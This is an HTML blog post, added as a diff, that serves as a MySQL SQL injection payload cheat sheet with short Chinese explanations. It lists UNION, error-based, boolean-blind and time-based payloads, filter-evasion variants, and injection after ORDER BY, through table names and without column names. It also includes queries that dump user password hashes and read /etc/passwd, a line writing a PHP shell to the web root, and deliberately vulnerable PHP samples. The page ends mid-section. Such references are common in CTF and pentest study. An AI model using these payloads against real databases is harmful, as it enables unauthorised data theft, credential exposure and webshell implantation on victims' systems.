@@ -1,0 +1,1494 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="google-site-verification" content="QFVAlCf-2gKGgg_VeeyNJs6Z1SZ3zFiHFVraulVVNSw" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/cat.jpg?v=">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/cat.jpg?v=">
+
+
+  <link rel="mask-icon" href="/images/logo.jpg?v=" color="#222">
+
+
+  <link rel="manifest" href="/images/manifest.json">
+
+
+  <meta name="msapplication-config" content="/images/browserconfig.xml" />
+
+
+
+  <meta name="keywords" content="sql,paylaod," />
+
+
+
+
+  
+
+
+  <link rel="alternate" href="/atom.xml" title="Bosch" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="所有用户：select group_concat(user) from mysql.user 用户hash：select group_concat(password) from mysql.user where user&#x3D;&#39;root&#39; 所有数据库：SELECT group_concat(schema_name) from information_schema.schemata 表名">
+<meta property="og:type" content="article">
+<meta property="og:title" content="paylaod-sql">
+<meta property="og:url" content="https://ckcah.github.io/2020/05/02/paylaod-sql/index.html">
+<meta property="og:site_name" content="Bosch">
+<meta property="og:description" content="所有用户：select group_concat(user) from mysql.user 用户hash：select group_concat(password) from mysql.user where user&#x3D;&#39;root&#39; 所有数据库：SELECT group_concat(schema_name) from information_schema.schemata 表名">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://ckcah.github.io/images/paylaod-sql/1.jpg">
+<meta property="og:image" content="https://ckcah.github.io/images/paylaod-sql/2.jpg">
+<meta property="og:image" content="https://ckcah.github.io/images/paylaod-sql/3.jpg">
+<meta property="og:image" content="https://ckcah.github.io/images/paylaod-sql/4.jpg">
+<meta property="og:image" content="https://ckcah.github.io/images/paylaod-sql/5.jpg">
+<meta property="og:image" content="https://ckcah.github.io/images/paylaod-sql/6.jpg">
+<meta property="og:image" content="https://ckcah.github.io/images/paylaod-sql/7.jpg">
+<meta property="og:image" content="https://ckcah.github.io/images/paylaod-sql/8.jpg">
+<meta property="og:image" content="https://ckcah.github.io/images/paylaod-sql/9.jpg">
+<meta property="og:image" content="https://ckcah.github.io/images/paylaod-sql/10.jpg">
+<meta property="og:image" content="https://ckcah.github.io/images/paylaod-sql/11.jpg">
+<meta property="og:image" content="https://ckcah.github.io/images/paylaod-sql/12.jpg">
+<meta property="og:image" content="https://ckcah.github.io/images/paylaod-sql/13.jpg">
+<meta property="og:image" content="https://ckcah.github.io/images/paylaod-sql/14.jpg">
+<meta property="og:image" content="https://ckcah.github.io/images/paylaod-sql/15.jpg">
+<meta property="og:image" content="https://ckcah.github.io/images/paylaod-sql/16.jpg">
+<meta property="og:image" content="https://ckcah.github.io/images/paylaod-sql/17.jpg">
+<meta property="article:published_time" content="2020-05-02T13:05:02.000Z">
+<meta property="article:modified_time" content="2020-05-07T10:14:34.000Z">
+<meta property="article:author" content="bosch cheng">
+<meta property="article:tag" content="sql">
+<meta property="article:tag" content="paylaod">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ckcah.github.io/images/paylaod-sql/1.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://ckcah.github.io/2020/05/02/paylaod-sql/"/>
+
+
+
+
+
+  <title>paylaod-sql | Bosch</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Bosch</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">cheng</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+            
+            Sitemap
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-commonweal">
+          <a href="/404/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br />
+            
+            Commonweal 404
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://ckcah.github.io/2020/05/02/paylaod-sql/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="bosch cheng">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/emperor.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Bosch">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">paylaod-sql</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-05-02T21:05:02+08:00">
+                2020-05-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2020/05/02/paylaod-sql/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2020/05/02/paylaod-sql/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2020/05/02/paylaod-sql/" class="leancloud_visitors" data-flag-title="paylaod-sql">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Visitors&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>所有用户：<br><code>select group_concat(user) from mysql.user</code></p>
+<p>用户hash：<br><code>select group_concat(password) from mysql.user where user=&#39;root&#39;</code></p>
+<p>所有数据库：<br><code>SELECT group_concat(schema_name) from information_schema.schemata</code></p>
+<p>表名：<br><code>SELECT group_concat(table_name) from information_schema.tables where table_schema=&#39;库名&#39;</code></p>
+<p>//表中有主码约束，非空约束等完整性约束条件的才能用这个语句查询出来<br><code>SELECT group_concat(table_name) from information_schema.table_constraints where table_schema=&#39;库名&#39;</code></p>
+<p>字段名：<br><code>SELECT group_concat(column_name) from information_schema.columns where table_name=&#39;表名&#39;</code></p>
+<p>读文件：<br><code>SELECT load_file(&#39;/etc/passwd&#39;)</code></p>
+<p>写文件：<br><code>SELECT  into outfile &#39;/var/www/html/shell.php&#39;</code></p>
+<h2 id="1-2-UNION注入"><a href="#1-2-UNION注入" class="headerlink" title="1.2 UNION注入"></a>1.2 UNION注入</h2><h3 id="1-2-1-猜字段长度"><a href="#1-2-1-猜字段长度" class="headerlink" title="1.2.1 猜字段长度"></a>1.2.1 猜字段长度</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">order by num&#96;</span><br><span class="line">Example：&#96;id&#x3D;1 order by 2&#96; 页面正常，&#96;id&#x3D;3 order by 6&#96;页面错误，那么字段就是2</span><br><span class="line">字符型的话需要注释后面的引号，Example：</span><br><span class="line">&#96;id&#x3D;1&#39; order by 2%23</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-2-2-暴字段位置"><a href="#1-2-2-暴字段位置" class="headerlink" title="1.2.2 暴字段位置"></a>1.2.2 暴字段位置</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;2 UNION SELECT 1,2 或 id&#x3D;-1 UNION SELECT 1,2</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-2-3-基本语法"><a href="#1-2-3-基本语法" class="headerlink" title="1.2.3 基本语法"></a>1.2.3 基本语法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNION SELECT 1,password,3 from admin</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-3-报错注入"><a href="#1-3-报错注入" class="headerlink" title="1.3 报错注入"></a>1.3 报错注入</h2><p>mysql暴错注入方法整理，通过floor，UpdateXml，ExtractValue，NAME_CONST，Error based Double Query Injection等方法</p>
+<h3 id="1-3-1-floor"><a href="#1-3-1-floor" class="headerlink" title="1.3.1 floor"></a>1.3.1 floor</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 OR (SELECT 8627 FROM(SELECT COUNT(*),CONCAT(0x70307e,(SELECT user()),0x7e7030,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-3-2-ExtractValue-有长度限制-最长32位"><a href="#1-3-2-ExtractValue-有长度限制-最长32位" class="headerlink" title="1.3.2 ExtractValue(有长度限制,最长32位)"></a>1.3.2 ExtractValue(有长度限制,最长32位)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 and extractvalue(1, concat(0x7e, (select @@version),0x7e))</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-3-3-UpdateXml-有长度限制-最长32位"><a href="#1-3-3-UpdateXml-有长度限制-最长32位" class="headerlink" title="1.3.3 UpdateXml(有长度限制,最长32位)"></a>1.3.3 UpdateXml(有长度限制,最长32位)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-3-4-NAME-CONST-适用于低版本，不太好用"><a href="#1-3-4-NAME-CONST-适用于低版本，不太好用" class="headerlink" title="1.3.4 NAME_CONST(适用于低版本，不太好用)"></a>1.3.4 NAME_CONST(适用于低版本，不太好用)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;261 and 1&#x3D;(select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-3-5-Error-based-Double-Query-Injection"><a href="#1-3-5-Error-based-Double-Query-Injection" class="headerlink" title="1.3.5 Error based Double Query Injection"></a>1.3.5 Error based Double Query Injection</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 or 1 group by concat_ws(0x7e,version(),floor(rand(0)*2)) having min(0) or 1</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-3-6-exp-5-5-5以上"><a href="#1-3-6-exp-5-5-5以上" class="headerlink" title="1.3.6 exp(5.5.5以上)"></a>1.3.6 exp(5.5.5以上)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and (select exp(~(select * from(select user())x)))</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-4-BOOL盲注"><a href="#1-4-BOOL盲注" class="headerlink" title="1.4 BOOL盲注"></a>1.4 BOOL盲注</h2><p>盲注的时候一定注意，MySQL4之后大小写不敏感，可使用binary()函数使大小写敏感。</p>
+<h3 id="1-4-1-构造布尔条件"><a href="#1-4-1-构造布尔条件" class="headerlink" title="1.4.1 构造布尔条件"></a>1.4.1 构造布尔条件</h3><p>现在很多CTF比赛脑洞都出在了bool条件的构造，花式bool条件构造。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">//正常情况</span><br><span class="line">'or bool<span class="comment">#</span></span><br><span class="line">true'and bool<span class="comment">#</span></span><br><span class="line">    </span><br><span class="line">//不使用空格、注释</span><br><span class="line">'or(bool)='1</span><br><span class="line">true'and(bool)='1</span><br><span class="line">    </span><br><span class="line">//不使用or、and、注释</span><br><span class="line">'^!(bool)='1</span><br><span class="line">'=(bool)='</span><br><span class="line">'||(bool)='1</span><br><span class="line">true'%26%26(bool)='1</span><br><span class="line">'=if((bool),1,0)='0</span><br><span class="line">    </span><br><span class="line">//不使用等号、空格、注释</span><br><span class="line">'or(bool)&lt;&gt;'0</span><br><span class="line">'or((bool)in(1))or'0</span><br><span class="line">    </span><br><span class="line">//其他</span><br><span class="line">or (case when (bool) then 1 else 0 <span class="keyword">end</span>)</span><br></pre></td></tr></table></figure>
+
+<p>有时候where字句有括号又猜不到SQL语句的时候，可以有下列类似的fuzz</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1' or (bool) or '1'='1</span><br><span class="line">1%' and (bool) or 1=1 and '1'='1</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-4-2-构造逻辑判断"><a href="#1-4-2-构造逻辑判断" class="headerlink" title="1.4.2 构造逻辑判断"></a>1.4.2 构造逻辑判断</h3><p>逻辑判断基本就那些函数：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">left(user(),1)&gt;'r'  </span><br><span class="line">right(user(),1)&gt;'r'  </span><br><span class="line">substr(user(),1,1)='r'  </span><br><span class="line">mid(user(),1,1)='r' </span><br><span class="line">    </span><br><span class="line">//不使用逗号 </span><br><span class="line">user() regexp '^[a-z]'</span><br><span class="line">user() like 'root%'</span><br><span class="line">POSITION('root' in user())</span><br><span class="line">mid(user() from 1 for 1)='r'</span><br><span class="line">mid(user() from 1)='r'</span><br></pre></td></tr></table></figure>
+
+<p><code>ASCII()</code>、<code>ORD()</code>和<code>CHAR()</code>函数一般用做辅助。</p>
+<h3 id="1-4-3-利用order-by盲注"><a href="#1-4-3-利用order-by盲注" class="headerlink" title="1.4.3 利用order by盲注"></a>1.4.3 利用order by盲注</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from admin where username='' or 1 union select 1,2,'5' order by 3;</span><br><span class="line">+<span class="comment">----+----------+----------------------------------+</span></span><br><span class="line">| id | username | password                         |</span><br><span class="line">+<span class="comment">----+----------+----------------------------------+</span></span><br><span class="line">|  1 | 2        | 5                                |</span><br><span class="line">|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">+<span class="comment">----+----------+----------------------------------+</span></span><br><span class="line">2 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line">    </span><br><span class="line">mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username=<span class="string">''</span> <span class="keyword">or</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">'6'</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span>;</span><br><span class="line">+<span class="comment">----+----------+----------------------------------+</span></span><br><span class="line">| id | username | password                         |</span><br><span class="line">+<span class="comment">----+----------+----------------------------------+</span></span><br><span class="line">|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">|  1 | 2        | 6                                |</span><br><span class="line">+<span class="comment">----+----------+----------------------------------+</span></span><br><span class="line">2 rows in <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br></pre></td></tr></table></figure>
+
+<p>这种注入一般出现在登录处，形成bool条件。这里只获取password的值，也可以跟多个UNION查询其他的数据，此方法优点在于不使用括号等号等字符。利用order by姿势很多，自由发挥了。</p>
+<h2 id="1-5-延时盲注"><a href="#1-5-延时盲注" class="headerlink" title="1.5 延时盲注"></a>1.5 延时盲注</h2><p>相对于bool盲注，就是把返回值0和1改为是否执行延时，<strong>能用其他方法就不使用延时</strong>。<br>一般格式<code>if((bool),sleep(3),0)</code>和<code>or (case when (bool) then sleep(3) else 0 end)</code></p>
+<p>两个函数：<br><code>BENCHMARK(100000,MD5(1)) or sleep(5)</code></p>
+<p>BENCHMARK()用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的cpu资源。推荐使用sleep()</p>
+<h2 id="1-6-MySQL注释符："><a href="#1-6-MySQL注释符：" class="headerlink" title="1.6 MySQL注释符："></a>1.6 MySQL注释符：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. <span class="comment">-- -</span></span><br><span class="line">2. <span class="comment">/* .... */</span></span><br><span class="line">3. <span class="comment">#</span></span><br><span class="line">4. `</span><br><span class="line">5. ;%00</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-7-Insert-amp-Update注入"><a href="#1-7-Insert-amp-Update注入" class="headerlink" title="1.7 Insert&amp;Update注入"></a>1.7 Insert&amp;Update注入</h2><p>insert和update一般使用报错注入<br><img src="https://ckcah.github.io/images/paylaod-sql/1.jpg"></p>
+<p>如果没有错误回显，insert可以使用延时注入：<br><img src="https://ckcah.github.io/images/paylaod-sql/2.jpg"></p>
+<p>update可以使用bool盲注和延时盲注。</p>
+<h2 id="1-8-order-by后的注入"><a href="#1-8-order-by后的注入" class="headerlink" title="1.8 order by后的注入"></a>1.8 order by后的注入</h2><h3 id="1-8-1-报错注入"><a href="#1-8-1-报错注入" class="headerlink" title="1.8.1 报错注入"></a>1.8.1 报错注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and extractvalue(1, concat(0x7e, (select @@version),0x7e))</span><br></pre></td></tr></table></figure>
+
+<img src="https://ckcah.github.io/images/paylaod-sql/3.jpg">
+
+<h3 id="1-8-2-bool盲注"><a href="#1-8-2-bool盲注" class="headerlink" title="1.8.2 bool盲注"></a>1.8.2 bool盲注</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by IF((bool),1,(select 1 union select 2))</span><br></pre></td></tr></table></figure>
+
+<img src="https://ckcah.github.io/images/paylaod-sql/4.jpg">
+
+<h3 id="1-8-3-延时盲注"><a href="#1-8-3-延时盲注" class="headerlink" title="1.8.3 延时盲注"></a>1.8.3 延时盲注</h3><p>不推荐，因为每条数据都会执行延时，<strong>能用其他方法就不使用延时</strong>。<br><code>order by IF(1,sleep(3),0);</code><br><img src="https://ckcah.github.io/images/paylaod-sql/5.jpg"><br>两条数据延时了6秒</p>
+<h2 id="1-9-表名可控注入"><a href="#1-9-表名可控注入" class="headerlink" title="1.9 表名可控注入"></a>1.9 表名可控注入</h2><h3 id="1-9-1-表名不完全可控且DESC的表名含有identifier-quote-SELECT的表名不含identifier-quote"><a href="#1-9-1-表名不完全可控且DESC的表名含有identifier-quote-SELECT的表名不含identifier-quote" class="headerlink" title="1.9.1 表名不完全可控且DESC的表名含有identifier quote,SELECT的表名不含identifier quote"></a>1.9.1 表名不完全可控且DESC的表名含有identifier quote,SELECT的表名不含identifier quote</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">mysql_query(<span class="string">"use b2cshop"</span>);</span><br><span class="line">$table = $_GET[<span class="string">'table'</span>];</span><br><span class="line">mysql_query(<span class="string">"desc `shop_&#123;$table&#125;`"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"DESC 出错:"</span>.mysql_error());</span><br><span class="line">$sql = <span class="string">"select * from shop_&#123;$table&#125; where 1=1"</span>;</span><br><span class="line"><span class="keyword">echo</span> $sql;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line">var_dump(mysql_fetch_array(mysql_query(<span class="string">"$sql"</span>)));</span><br><span class="line"><span class="keyword">echo</span> mysql_error();</span><br></pre></td></tr></table></figure>
+
+<img src="https://ckcah.github.io/images/paylaod-sql/6.jpg">
+shop_users 后面的两个``,做了shop_users 表的别名,所以无影响。
+这时候desc的语句为,
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">desc `shop_users` `where updatexml(1,concat(0x5e24,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x5e24</span>),<span class="number">1</span>)<span class="comment">#`</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="1-9-2-表名不完全可控且DESC的表名不含identifier-quote-SELECT的表名含有identifier-quote"><a href="#1-9-2-表名不完全可控且DESC的表名不含identifier-quote-SELECT的表名含有identifier-quote" class="headerlink" title="1.9.2 表名不完全可控且DESC的表名不含identifier quote,SELECT的表名含有identifier quote"></a>1.9.2 表名不完全可控且DESC的表名不含identifier quote,SELECT的表名含有identifier quote</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">mysql_query(<span class="string">"use b2cshop"</span>);</span><br><span class="line">$table = $_GET[<span class="string">'table'</span>];</span><br><span class="line">mysql_query(<span class="string">"desc shop_&#123;$table&#125;"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"DESC 出错:"</span>.mysql_error());</span><br><span class="line">$sql = <span class="string">"select * from `shop_&#123;$table&#125;` where 1=1"</span>;</span><br><span class="line"><span class="keyword">echo</span> $sql;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line">var_dump(mysql_fetch_array(mysql_query(<span class="string">"$sql"</span>)));</span><br><span class="line"><span class="keyword">echo</span> mysql_error();</span><br></pre></td></tr></table></figure>
+
+<img src="https://ckcah.github.io/images/paylaod-sql/7.jpg">
+
+<h2 id="1-10-无列明注入"><a href="#1-10-无列明注入" class="headerlink" title="1.10 无列明注入"></a>1.10 无列明注入</h2><h3 id="1-10-1-别名"><a href="#1-10-1-别名" class="headerlink" title="1.10.1 别名"></a>1.10.1 别名</h3><p><code>union (select 1,2,c from (select 1,2 c union select * from flag)b) limit 1,1</code><br><img src="https://ckcah.github.io/images/paylaod-sql/8.jpg"></p>
+<p>或者<br><code>union (select 1,2,c from (select 1,2 as c union select * from flag) as b) limit 1,1</code><br><img src="https://ckcah.github.io/images/paylaod-sql/9.jpg"></p>
+<h3 id="1-10-2-变量"><a href="#1-10-2-变量" class="headerlink" title="1.10.2 变量"></a>1.10.2 变量</h3><p>需要一个请求两个注入</p>
+<img src="https://ckcah.github.io/images/paylaod-sql/10.jpg">
+
